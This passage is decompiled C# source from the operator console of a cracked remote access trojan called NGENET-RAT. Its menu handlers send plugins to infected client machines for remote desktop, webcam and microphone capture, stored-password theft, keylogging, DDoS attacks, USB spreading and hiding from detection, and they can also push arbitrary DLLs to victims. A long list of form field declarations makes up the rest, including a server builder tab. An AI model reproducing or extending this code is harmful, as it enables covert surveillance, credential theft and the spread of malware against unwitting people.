						plg pLG = ima.GETPLG("NG009.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
						Logsaktifitas.LOG("Start Remote Desktop " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_87)
			{
				ProjectData.SetProjectError(expr_87);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000296 RID: 662 RVA: 0x0001B250 File Offset: 0x00019450
		private void WebcamToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						plg pLG = ima.GETPLG("NG010.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_66)
			{
				ProjectData.SetProjectError(expr_66);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000297 RID: 663 RVA: 0x0001B2F0 File Offset: 0x000194F0
		private void MicrophoneToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						plg pLG = ima.GETPLG("NG011.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
						Logsaktifitas.LOG("Start Remote Microphone " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_87)
			{
				ProjectData.SetProjectError(expr_87);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000298 RID: 664 RVA: 0x0001B3B0 File Offset: 0x000195B0
		private void ChatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						plg pLG = ima.GETPLG("NG012.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
						Logsaktifitas.LOG("Start Remote Chat " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_87)
			{
				ProjectData.SetProjectError(expr_87);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000299 RID: 665 RVA: 0x0001B470 File Offset: 0x00019670
		private void GetPasswordToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ULT || this.PRS)
			{
				try
				{
					try
					{
						IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							plg pLG = ima.GETPLG("NG013.ngg", null);
							ima.SendPlug((Client)listViewItem.Tag, pLG, false);
							Logsaktifitas.LOG("Start Stored Password(s) " + listViewItem.SubItems[5].Text);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					return;
				}
				catch (Exception expr_9A)
				{
					ProjectData.SetProjectError(expr_9A);
					ProjectData.ClearProjectError();
					return;
				}
			}
			MessageBox.Show("3iezW0rld - TurkHacker346 NGENET-RAT Cracked!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x0600029A RID: 666 RVA: 0x0001B554 File Offset: 0x00019754
		private void DDoSStresserToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.ULT || this.PRS)
			{
				try
				{
					try
					{
						IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							plg pLG = ima.GETPLG("NG014.ngg", null);
							ima.SendPlug((Client)listViewItem.Tag, pLG, false);
							Logsaktifitas.LOG("Start Remote DDoS Attack " + listViewItem.SubItems[5].Text);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					return;
				}
				catch (Exception expr_9A)
				{
					ProjectData.SetProjectError(expr_9A);
					ProjectData.ClearProjectError();
					return;
				}
			}
			ima.F.sl.Text = "3iezW0rld - TurkHacker346 NGENET-RAT Cracked!";
		}

		// Token: 0x0600029B RID: 667 RVA: 0x0001B63C File Offset: 0x0001983C
		private void ToolStripMenuItem5_Click(object sender, EventArgs e)
		{
			try
			{
				ima.GETPLG("kl.ngg", null);
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						if (Operators.CompareString(listViewItem.SubItems[12].Text, "False", false) == 0)
						{
							if (MessageBox.Show("RemoteKeyLogger Plugin Not Found! \r\nClick \"Ok\" to Upload Plugin!", "Plugin Information", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
							{
								bool flag = true;
								string text = "Plugins\\RemoteKeyLogger.dll";
								string text2 = Convert.ToBase64String(Fungsi.ZIP(File.ReadAllBytes(text), ref flag));
								byte[] array = Fungsi.SB(ref text2);
								MemoryStream memoryStream = new MemoryStream();
								string text3 = "plg" + ima.Y + new FileInfo(text).Name + ima.Y;
								memoryStream.Write(Fungsi.SB(ref text3), 0, text3.Length);
								memoryStream.Write(array, 0, array.Length);
								Thread thread = new Thread(new ParameterizedThreadStart(ima.SendTo), 1);
								thread.Start(new object[]
								{
									this.L1.SelectedItems,
									memoryStream.ToArray(),
									Color.WhiteSmoke
								});
								Logsaktifitas.LOG("Send Plugin RemoteKeyLogger.dll " + listViewItem.SubItems[5].Text);
							}
						}
						else
						{
							NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
							{
								"klog"
							}, null, null, null, true);
							Logsaktifitas.LOG("Start Remote Keylogger " + listViewItem.SubItems[5].Text);
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_1C2)
			{
				ProjectData.SetProjectError(expr_1C2);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600029C RID: 668 RVA: 0x0001B850 File Offset: 0x00019A50
		private void IPLockupToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						new FrmIPlockup
						{
							ip = listViewItem.SubItems[1].Text,
							sk = (Client)listViewItem.Tag
						}.Show();
						Logsaktifitas.LOG("Start IP Lockup " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_9C)
			{
				ProjectData.SetProjectError(expr_9C);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600029D RID: 669 RVA: 0x0001B924 File Offset: 0x00019B24
		private void ScriptToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			FrmScript frmScript = new FrmScript();
			try
			{
				IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					frmScript.sk = (Client)listViewItem.Tag;
					frmScript.Show();
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600029E RID: 670 RVA: 0x0001B9A4 File Offset: 0x00019BA4
		private void InformationsToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						Logsaktifitas.LOG("Start Informations " + listViewItem.SubItems[5].Text);
						plg pLG = ima.GETPLG("NG017.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_87)
			{
				ProjectData.SetProjectError(expr_87);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600029F RID: 671 RVA: 0x0001BA64 File Offset: 0x00019C64
		private void CopyIPAddressToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					MyProject.Computer.Clipboard.SetText(listViewItem.SubItems[1].Text);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060002A0 RID: 672 RVA: 0x0001BAE8 File Offset: 0x00019CE8
		private void PluginInformationsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ULT)
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							"inpl"
						}, null, null, null, true);
						Logsaktifitas.LOG("Start Plugin Manager " + listViewItem.SubItems[5].Text);
					}
					return;
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			ima.F.sl.Text = "3iezW0rld - TurkHacker346 NGENET-RAT Cracked";
		}

		// Token: 0x060002A1 RID: 673 RVA: 0x0001BBB0 File Offset: 0x00019DB0
		private void FromDiskToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			if (this.ULT)
			{
				if (this.L1.SelectedItems.Count != 0)
				{
					OpenFileDialog openFileDialog = new OpenFileDialog();
					openFileDialog.Filter = "DLL|*.dll";
					openFileDialog.FileName = "";
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						bool flag = true;
						string text = Convert.ToBase64String(Fungsi.ZIP(File.ReadAllBytes(openFileDialog.FileName), ref flag));
						byte[] array = Fungsi.SB(ref text);
						MemoryStream memoryStream = new MemoryStream();
						string text2 = "plg" + ima.Y + new FileInfo(openFileDialog.FileName).Name + ima.Y;
						memoryStream.Write(Fungsi.SB(ref text2), 0, text2.Length);
						memoryStream.Write(array, 0, array.Length);
						Thread thread = new Thread(new ParameterizedThreadStart(ima.SendTo), 1);
						thread.Start(new object[]
						{
							this.L1.SelectedItems,
							memoryStream.ToArray(),
							Color.WhiteSmoke
						});
					}
				}
			}
			else
			{
				ima.F.sl.Text = "3iezW0rld - TurkHacker346 NGENET-RAT Cracked!";
			}
		}

		// Token: 0x060002A2 RID: 674 RVA: 0x0001BCE4 File Offset: 0x00019EE4
		private void SellectAllServersToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.L1.Items.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					listViewItem.Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060002A3 RID: 675 RVA: 0x0001BD4C File Offset: 0x00019F4C
		private void ClearAllPluginsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.L1.Items.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(listViewItem.Tag, null, "Send", new object[]
					{
						"inpl@"
					}, null, null, null, true);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060002A4 RID: 676 RVA: 0x0001BDD4 File Offset: 0x00019FD4
		private void Form1_Resize(object sender, EventArgs e)
		{
			this.L1.FX();
			this.Lv1.FX();
			this.ControlDetector1.Lv1.FX();
			if (this.SC1.Checked)
			{
				try
				{
					if (this.WindowState == FormWindowState.Minimized)
					{
						this.Hide();
						this.ShowIcon = false;
						this.ShowInTaskbar = false;
						this.NotifyIcon1.Icon = this.Icon;
						this.NotifyIcon1.Text = this.Text;
						this.NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info;
						this.NotifyIcon1.BalloonTipTitle = this.Text;
						this.NotifyIcon1.BalloonTipText = "Online : x ".Replace("x", Conversions.ToString(this.L1.Items.Count));
						this.NotifyIcon1.ShowBalloonTip(1000);
					}
				}
				catch (Exception expr_D9)
				{
					ProjectData.SetProjectError(expr_D9);
					ProjectData.ClearProjectError();
				}
			}
		}

		// Token: 0x060002A5 RID: 677 RVA: 0x00002F56 File Offset: 0x00001156
		private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.ShowIcon = true;
			this.ShowInTaskbar = true;
			this.Show();
			this.WindowState = FormWindowState.Normal;
		}

		// Token: 0x060002A6 RID: 678 RVA: 0x00002F73 File Offset: 0x00001173
		[MethodImpl(MethodImplOptions.NoOptimization)]
		private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ProjectData.EndApp();
		}

		// Token: 0x060002A7 RID: 679 RVA: 0x00002F56 File Offset: 0x00001156
		private void NotifyIcon1_Click(object sender, EventArgs e)
		{
			this.ShowIcon = true;
			this.ShowInTaskbar = true;
			this.Show();
			this.WindowState = FormWindowState.Normal;
		}

		// Token: 0x060002A8 RID: 680 RVA: 0x0001BED8 File Offset: 0x0001A0D8
		private void HiddenServerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem arg_23_0 = (ListViewItem)enumerator.Current;
						bool flag = true;
						string text = "Plugins\\Hidden.dll";
						string text2 = Convert.ToBase64String(Fungsi.ZIP(File.ReadAllBytes(text), ref flag));
						byte[] array = Fungsi.SB(ref text2);
						MemoryStream memoryStream = new MemoryStream();
						string text3 = "plg" + ima.Y + new FileInfo(text).Name + ima.Y;
						memoryStream.Write(Fungsi.SB(ref text3), 0, text3.Length);
						memoryStream.Write(array, 0, array.Length);
						Thread thread = new Thread(new ParameterizedThreadStart(ima.SendTo), 1);
						thread.Start(new object[]
						{
							this.L1.SelectedItems,
							memoryStream.ToArray(),
							Color.WhiteSmoke
						});
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_10A)
			{
				ProjectData.SetProjectError(expr_10A);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x060002A9 RID: 681 RVA: 0x0001C034 File Offset: 0x0001A234
		private void AntiProcessHackerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem arg_23_0 = (ListViewItem)enumerator.Current;
						bool flag = true;
						string text = "Plugins\\AntiPmgrnHacker.dll";
						string text2 = Convert.ToBase64String(Fungsi.ZIP(File.ReadAllBytes(text), ref flag));
						byte[] array = Fungsi.SB(ref text2);
						MemoryStream memoryStream = new MemoryStream();
						string text3 = "plg" + ima.Y + new FileInfo(text).Name + ima.Y;
						memoryStream.Write(Fungsi.SB(ref text3), 0, text3.Length);
						memoryStream.Write(array, 0, array.Length);
						Thread thread = new Thread(new ParameterizedThreadStart(ima.SendTo), 1);
						thread.Start(new object[]
						{
							this.L1.SelectedItems,
							memoryStream.ToArray(),
							Color.WhiteSmoke
						});
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_10A)
			{
				ProjectData.SetProjectError(expr_10A);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x060002AA RID: 682 RVA: 0x0001C190 File Offset: 0x0001A390
		private void UsbSpreadsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem arg_23_0 = (ListViewItem)enumerator.Current;
						bool flag = true;
						string text = "Plugins\\UsbSpreads.dll";
						string text2 = Convert.ToBase64String(Fungsi.ZIP(File.ReadAllBytes(text), ref flag));
						byte[] array = Fungsi.SB(ref text2);
						MemoryStream memoryStream = new MemoryStream();
						string text3 = "plg" + ima.Y + new FileInfo(text).Name + ima.Y;
						memoryStream.Write(Fungsi.SB(ref text3), 0, text3.Length);
						memoryStream.Write(array, 0, array.Length);
						Thread thread = new Thread(new ParameterizedThreadStart(ima.SendTo), 1);
						thread.Start(new object[]
						{
							this.L1.SelectedItems,
							memoryStream.ToArray(),
							Color.WhiteSmoke
						});
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_10A)
			{
				ProjectData.SetProjectError(expr_10A);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x060002AB RID: 683 RVA: 0x0001C2EC File Offset: 0x0001A4EC
		private void B5_Click(object sender, EventArgs e)
		{
			this.B5.BackColor = Color.FromArgb(40, 40, 40);
			this.B2.BackColor = Color.FromArgb(10, 10, 10);
			this.B3.BackColor = Color.FromArgb(10, 10, 10);
			this.B1.BackColor = Color.FromArgb(10, 10, 10);
			this.B4.BackColor = Color.FromArgb(10, 10, 10);
			this.ControlToolBOX1.BringToFront();
		}

		// Token: 0x0400004F RID: 79
		private static List<WeakReference> __ENCList;

		// Token: 0x04000051 RID: 81
		[AccessedThroughProperty("SplitContainer1")]
		private SplitContainer _SplitContainer1;

		// Token: 0x04000052 RID: 82
		[AccessedThroughProperty("IMG")]
		private ImageList _IMG;

		// Token: 0x04000053 RID: 83
		[AccessedThroughProperty("OpenFolderToolStripMenuItem")]
		private ToolStripMenuItem _OpenFolderToolStripMenuItem;

		// Token: 0x04000054 RID: 84
		[AccessedThroughProperty("BottomToolStripPanel")]
		private ToolStripPanel _BottomToolStripPanel;

		// Token: 0x04000055 RID: 85
		[AccessedThroughProperty("TopToolStripPanel")]
		private ToolStripPanel _TopToolStripPanel;

		// Token: 0x04000056 RID: 86
		[AccessedThroughProperty("RightToolStripPanel")]
		private ToolStripPanel _RightToolStripPanel;

		// Token: 0x04000057 RID: 87
		[AccessedThroughProperty("LeftToolStripPanel")]
		private ToolStripPanel _LeftToolStripPanel;

		// Token: 0x04000058 RID: 88
		[AccessedThroughProperty("ContentPanel")]
		private ToolStripContentPanel _ContentPanel;

		// Token: 0x04000059 RID: 89
		[AccessedThroughProperty("P1")]
		private PictureBox _P1;

		// Token: 0x0400005A RID: 90
		[AccessedThroughProperty("L1")]
		private LV _L1;

		// Token: 0x0400005B RID: 91
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		// Token: 0x0400005C RID: 92
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		// Token: 0x0400005D RID: 93
		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		// Token: 0x0400005E RID: 94
		[AccessedThroughProperty("ColumnHeader4")]
		private ColumnHeader _ColumnHeader4;

		// Token: 0x0400005F RID: 95
		[AccessedThroughProperty("ColumnHeader5")]
		private ColumnHeader _ColumnHeader5;

		// Token: 0x04000060 RID: 96
		[AccessedThroughProperty("ColumnHeader6")]
		private ColumnHeader _ColumnHeader6;

		// Token: 0x04000061 RID: 97
		[AccessedThroughProperty("ColumnHeader7")]
		private ColumnHeader _ColumnHeader7;

		// Token: 0x04000062 RID: 98
		[AccessedThroughProperty("ColumnHeader8")]
		private ColumnHeader _ColumnHeader8;

		// Token: 0x04000063 RID: 99
		[AccessedThroughProperty("ColumnHeader9")]
		private ColumnHeader _ColumnHeader9;

		// Token: 0x04000064 RID: 100
		[AccessedThroughProperty("ColumnHeader10")]
		private ColumnHeader _ColumnHeader10;

		// Token: 0x04000065 RID: 101
		[AccessedThroughProperty("ColumnHeader11")]
		private ColumnHeader _ColumnHeader11;

		// Token: 0x04000066 RID: 102
		[AccessedThroughProperty("map")]
		private PictureBox _map;

		// Token: 0x04000067 RID: 103
		[AccessedThroughProperty("PUSER")]
		private Panel _PUSER;

		// Token: 0x04000068 RID: 104
		[AccessedThroughProperty("PLOGS")]
		private Panel _PLOGS;

		// Token: 0x04000069 RID: 105
		[AccessedThroughProperty("StatusStrip2")]
		private StatusStrip _StatusStrip2;

		// Token: 0x0400006A RID: 106
		[AccessedThroughProperty("OL")]
		private ToolStripStatusLabel _OL;

		// Token: 0x0400006B RID: 107
		[AccessedThroughProperty("STD")]
		private ToolStripStatusLabel _STD;

		// Token: 0x0400006C RID: 108
		[AccessedThroughProperty("ToolStripStatusLabel7")]
		private ToolStripStatusLabel _ToolStripStatusLabel7;

		// Token: 0x0400006D RID: 109
		[AccessedThroughProperty("Panel3")]
		private Panel _Panel3;

		// Token: 0x0400006E RID: 110
		[AccessedThroughProperty("Pp1")]
		private Pp1 _Pp1;

		// Token: 0x0400006F RID: 111
		[AccessedThroughProperty("StatusStrip3")]
		private StatusStrip _StatusStrip3;

		// Token: 0x04000070 RID: 112
		[AccessedThroughProperty("SRC")]
		private ToolStripStatusLabel _SRC;

		// Token: 0x04000071 RID: 113
		[AccessedThroughProperty("ToolStripStatusLabel8")]
		private ToolStripStatusLabel _ToolStripStatusLabel8;

		// Token: 0x04000072 RID: 114
		[AccessedThroughProperty("SSNT")]
		private ToolStripStatusLabel _SSNT;

		// Token: 0x04000073 RID: 115
		[AccessedThroughProperty("ToolStripStatusLabel10")]
		private ToolStripStatusLabel _ToolStripStatusLabel10;

		// Token: 0x04000074 RID: 116
		[AccessedThroughProperty("SCN")]
		private ToolStripStatusLabel _SCN;

		// Token: 0x04000075 RID: 117
		[AccessedThroughProperty("ImageButton")]
		private ImageList _ImageButton;

		// Token: 0x04000076 RID: 118
		[AccessedThroughProperty("PSOCKET")]
		private Panel _PSOCKET;

		// Token: 0x04000077 RID: 119
		[AccessedThroughProperty("Lv1")]
		private LV _Lv1;

		// Token: 0x04000078 RID: 120
		[AccessedThroughProperty("ColumnHeader12")]
		private ColumnHeader _ColumnHeader12;

		// Token: 0x04000079 RID: 121
		[AccessedThroughProperty("ColumnHeader13")]
		private ColumnHeader _ColumnHeader13;

		// Token: 0x0400007A RID: 122
		[AccessedThroughProperty("ColumnHeader14")]
		private ColumnHeader _ColumnHeader14;

		// Token: 0x0400007B RID: 123
		[AccessedThroughProperty("ContextMenuStrip2")]
		private ContextMenuStrip _ContextMenuStrip2;

		// Token: 0x0400007C RID: 124
		[AccessedThroughProperty("AddPortToListenToolStripMenuItem")]
		private ToolStripMenuItem _AddPortToListenToolStripMenuItem;

		// Token: 0x0400007D RID: 125
		[AccessedThroughProperty("SLGS2")]
		private CheckBox _SLGS2;

		// Token: 0x0400007E RID: 126
		[AccessedThroughProperty("SLGS3")]
		private CheckBox _SLGS3;

		// Token: 0x0400007F RID: 127
		[AccessedThroughProperty("SLGS1")]
		private CheckBox _SLGS1;

		// Token: 0x04000080 RID: 128
		[AccessedThroughProperty("SAUT")]
		private CheckBox _SAUT;

		// Token: 0x04000081 RID: 129
		[AccessedThroughProperty("SAUT2")]
		private CheckBox _SAUT2;

		// Token: 0x04000082 RID: 130
		[AccessedThroughProperty("SAUT1")]
		private CheckBox _SAUT1;

		// Token: 0x04000083 RID: 131
		[AccessedThroughProperty("Snotif2")]
		private CheckBox _Snotif2;

		// Token: 0x04000084 RID: 132
		[AccessedThroughProperty("Snotif")]
		private CheckBox _Snotif;

		// Token: 0x04000085 RID: 133
		[AccessedThroughProperty("Label6")]
		private Label _Label6;

		// Token: 0x04000086 RID: 134
		[AccessedThroughProperty("Prefresh")]
		private NumericUpDown _Prefresh;

		// Token: 0x04000087 RID: 135
		[AccessedThroughProperty("Label5")]
		private Label _Label5;

		// Token: 0x04000088 RID: 136
		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		// Token: 0x04000089 RID: 137
		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		// Token: 0x0400008A RID: 138
		[AccessedThroughProperty("Phight")]
		private NumericUpDown _Phight;

		// Token: 0x0400008B RID: 139
		[AccessedThroughProperty("Pwidth")]
		private NumericUpDown _Pwidth;

		// Token: 0x0400008C RID: 140
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x0400008D RID: 141
		[AccessedThroughProperty("Sthmb")]
		private CheckBox _Sthmb;

		// Token: 0x0400008E RID: 142
		[AccessedThroughProperty("Timer3")]
		private System.Windows.Forms.Timer _Timer3;

		// Token: 0x0400008F RID: 143
		[AccessedThroughProperty("sthmb1")]
		private CheckBox _sthmb1;

		// Token: 0x04000090 RID: 144
		[AccessedThroughProperty("SplitContainer2")]
		private SplitContainer _SplitContainer2;

		// Token: 0x04000091 RID: 145
		[AccessedThroughProperty("Button5")]
		private Button _Button5;

		// Token: 0x04000092 RID: 146
		[AccessedThroughProperty("Button4")]
		private Button _Button4;

		// Token: 0x04000093 RID: 147
		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		// Token: 0x04000094 RID: 148
		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		// Token: 0x04000095 RID: 149
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000096 RID: 150
		[AccessedThroughProperty("Label9")]
		private Label _Label9;

		// Token: 0x04000097 RID: 151
		[AccessedThroughProperty("Comboape")]
		private ComboBox _Comboape;

		// Token: 0x04000098 RID: 152
		[AccessedThroughProperty("Button7")]
		private Button _Button7;

		// Token: 0x04000099 RID: 153
		[AccessedThroughProperty("Button6")]
		private Button _Button6;

		// Token: 0x0400009A RID: 154
		[AccessedThroughProperty("Label7")]
		private Label _Label7;

		// Token: 0x0400009B RID: 155
		[AccessedThroughProperty("Label8")]
		private Label _Label8;

		// Token: 0x0400009C RID: 156
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x0400009D RID: 157
		[AccessedThroughProperty("HPanel1")]
		private Panel _HPanel1;

		// Token: 0x0400009E RID: 158
		[AccessedThroughProperty("HPanel2")]
		private Panel _HPanel2;

		// Token: 0x0400009F RID: 159
		[AccessedThroughProperty("Label10")]
		private Label _Label10;

		// Token: 0x040000A0 RID: 160
		[AccessedThroughProperty("Label11")]
		private Label _Label11;

		// Token: 0x040000A1 RID: 161
		[AccessedThroughProperty("Label12")]
		private Label _Label12;

		// Token: 0x040000A2 RID: 162
		[AccessedThroughProperty("HPanel3")]
		private Panel _HPanel3;

		// Token: 0x040000A3 RID: 163
		[AccessedThroughProperty("Label13")]
		private Label _Label13;

		// Token: 0x040000A4 RID: 164
		[AccessedThroughProperty("Label15")]
		private Label _Label15;

		// Token: 0x040000A5 RID: 165
		[AccessedThroughProperty("Cnoip")]
		private CheckBox _Cnoip;

		// Token: 0x040000A6 RID: 166
		[AccessedThroughProperty("Cnoip1")]
		private CheckBox _Cnoip1;

		// Token: 0x040000A7 RID: 167
		[AccessedThroughProperty("LinkLabelNoip")]
		private LinkLabel _LinkLabelNoip;

		// Token: 0x040000A8 RID: 168
		[AccessedThroughProperty("ButtonNoip")]
		private Button _ButtonNoip;

		// Token: 0x040000A9 RID: 169
		[AccessedThroughProperty("noipstatus")]
		private TextBox _noipstatus;

		// Token: 0x040000AA RID: 170
		[AccessedThroughProperty("Label14")]
		private Label _Label14;

		// Token: 0x040000AB RID: 171
		[AccessedThroughProperty("PasswordTextBox")]
		private TextBox _PasswordTextBox;

		// Token: 0x040000AC RID: 172
		[AccessedThroughProperty("Label16")]
		private Label _Label16;

		// Token: 0x040000AD RID: 173
		[AccessedThroughProperty("UsernameTextBox")]
		private TextBox _UsernameTextBox;

		// Token: 0x040000AE RID: 174
		[AccessedThroughProperty("Label17")]
		private Label _Label17;

		// Token: 0x040000AF RID: 175
		[AccessedThroughProperty("HostTextBox")]
		private TextBox _HostTextBox;

		// Token: 0x040000B0 RID: 176
		[AccessedThroughProperty("TabControl1")]
		private TabControl _TabControl1;

		// Token: 0x040000B1 RID: 177
		[AccessedThroughProperty("Client_Settings")]
		private TabPage _Client_Settings;

		// Token: 0x040000B2 RID: 178
		[AccessedThroughProperty("User_Logs")]
		private TabPage _User_Logs;

		// Token: 0x040000B3 RID: 179
		[AccessedThroughProperty("Port_Manager")]
		private TabPage _Port_Manager;

		// Token: 0x040000B4 RID: 180
		[AccessedThroughProperty("User_Online")]
		private TabPage _User_Online;

		// Token: 0x040000B5 RID: 181
		[AccessedThroughProperty("NgenetRAT")]
		private TabPage _NgenetRAT;

		// Token: 0x040000B6 RID: 182
		[AccessedThroughProperty("Server_Builder")]
		private TabPage _Server_Builder;

		// Token: 0x040000B7 RID: 183
		[AccessedThroughProperty("About_me")]
		private TabPage _About_me;

		// Token: 0x040000B8 RID: 184
		[AccessedThroughProperty("Menu1")]
		private ContextMenuStrip _Menu1;

